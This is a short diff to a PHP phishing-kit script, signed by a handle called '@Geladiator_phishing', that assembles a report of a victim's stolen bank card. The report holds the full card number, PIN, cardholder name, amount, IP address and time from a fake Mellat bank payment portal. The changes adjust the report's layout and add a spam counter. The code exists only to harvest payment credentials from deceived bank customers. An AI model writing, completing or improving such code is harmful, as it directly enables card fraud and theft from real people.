@@ -59,9 +59,10 @@ $ch = curl_init();
         $json       = json_decode($result, true);
         $holderName = $json["firstName"] . " " . $json["lastName"];
 $Text = "
+
 ✅ Transaction finished!
 -------------- BANK --------------
-🏦 Name : $bankname
+🏦 Name : $bankname $bankinfo[1]
 -------------- CARD --------------
 💳 Card : <code>$pan1 $pan2 $pan3 $pan4</code>
 🔐 Paas : <code>$pin</code>
@@ -70,16 +71,17 @@ $Text = "
 -------------- INFO --------------
 👤 Card Holder : <code>$holderName</code>
 💴 Amount : $amount 𝗥𝗶𝗮𝗹𝘀
-$mailinfo
 📍 IP : <code>$ip</code>
 ⏰ Time : $saat
 📝 ToDay : $roz
 📌 Date : $tarikh
 ✨ Portal : Mellat
--------------- $bankname --------------$bankinfo
+-------------- $bankinfo[1] --------------$bankinfo[0]
 ------------- Creator -------------
 🆔 : @Geladiator_phishing :)
 ";
+    
+$Text .="\n$bankinfo[0]⁉️Spam: $num";
 $T="000";
 $I= 0000;
 
